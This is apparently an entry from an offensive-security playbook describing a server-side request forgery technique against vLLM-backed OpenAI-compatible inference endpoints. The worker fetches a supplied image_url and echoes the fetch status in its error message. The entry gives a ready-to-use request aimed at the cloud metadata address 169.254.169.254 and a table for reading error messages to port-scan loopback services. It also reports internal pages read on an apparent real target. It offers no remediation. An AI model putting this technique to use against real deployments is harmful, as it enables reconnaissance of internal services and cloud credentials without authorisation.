# 1. vLLM `image_url` SSRF + COST-FREE status oracle (the big one)

- source canon: `holyshit-mode/vllm-gateway-internal-fleet-ssrf.md`
- bindings: **WSTG-BUSL-08** · **CWE-841** · **ATT&CK T1574**
- generated: 2026-11-04

## The technique

On vLLM-backed OpenAI-compatible inference endpoints, `POST {api}/invocations` (and some
`/v1/chat/completions`) accept an `image_url` content part that the worker **fetches server-side**
and — crucially — **reports the fetched HTTP status / connect result in the error message**.

### The primitive
```
POST https://<internal-gateway>/invocations
{"model":"deepseek-v4-flash",
 "messages":[{"role":"user","content":[
   {"type":"image_url","image_url":{"url":"http://169.254.169.254/latest/meta-data/"}}]}]}
```
→ `422 {"error":{"message":"Failed to fetch media from URL: HTTP 404 error (parameter=image_url,
value=http://169.254.169.254/latest/meta-data/)"}}`
The `HTTP 404 error` is the **server-side fetch result echoed back** — your read oracle.

### Cost-free discrimination (do NOT generate completions — every /invocations call bills the upstream)
Point `image_url` at a target and read the error, **not** a completion:

| `image_url` target | Error/echo | Meaning |
|---|---|---|
| `http://169.254.169.254/...` | `HTTP 404 error` | IMDS reachable; IMDSv2 → 404 without token (hardened, reach confirmed) |
| `http://127.0.0.1:8000/` | `HTTP 404 error` | a real HTTP service answers on that loopback port |
| `http://127.0.0.1:5432/` | `500 Cannot connect to host ... ssl:default [Connect call failed]` | loopback TLS listener there (Postgres etc.) |
| `http://127.0.0.1:9090/` | `500 Cannot connect to host` | closed/filtered |
| `http://<ext-host>:8000/` or `10.0.0.1` | hang/timeout | DNS resolves but connect blocked — SSRF is **loopback/IMDS-scoped**, not arbitrary-everywhere |

### Key discriminators learned
- **Open-service vs closed vs TLS-listener** is fully distinguishable from the error echo → this IS
  a working internal **port scanner** with no token burn.
- **Content-received signal:** when the fetched response is valid HTTP 200 but not an image, the
  error becomes `Failed to load image: cannot identify ...` (NOT connect/404) → you retrieved real
  **content** from an internal endpoint. On the target, `127.0.0.1:8000/{docs,metrics,openapi.json,health}`
  returned this = **loopback-only internal `/docs` + `/metrics` + `/openapi.json` readable via SSRF**
  that the public Host-header ACL hid.
- **401 echo:** `image_url: http://127.0.0.1:8000/v1/models` → `HTTP 401 error` — internal route
  auth-matches public; tells you the internal service still enforces keys (log as coverage).
- ICMP/random external hosts hang (000 timeout) → the fetch egress is filtered beyond loopback/IMDS.
  Run enough targets to characterize the ceiling honestly, then state it.

## Family use

- decisive-test shape lives in the source canon
- walls: validation-only · NO-GAIN · documented-class adaptation only
